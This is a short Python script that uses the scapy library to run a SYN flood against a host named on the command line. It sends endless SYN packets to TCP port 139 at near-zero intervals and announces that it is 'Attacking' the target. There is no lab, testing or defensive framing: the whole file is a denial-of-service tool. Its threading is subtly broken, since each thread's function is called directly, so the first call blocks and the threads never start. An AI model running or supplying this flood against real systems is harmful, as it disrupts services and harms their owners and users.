import sys
from scapy.all import *

target = str(sys.argv[1])

print("Attacking " + target + " with SYN flood.")

def syn_flood():
    packet = IP(dst = target)/TCP(dport = 139, flags = "S") / ("payloadpayloadpayload")
    send(packet, inter = 0.000001, loop = 1)

t1 = threading.Thread(target=syn_flood())
t2 = threading.Thread(target=syn_flood())
t3 = threading.Thread(target=syn_flood())
t4 = threading.Thread(target=syn_flood())

t1.start()
t2.start()
t3.start()
t4.start()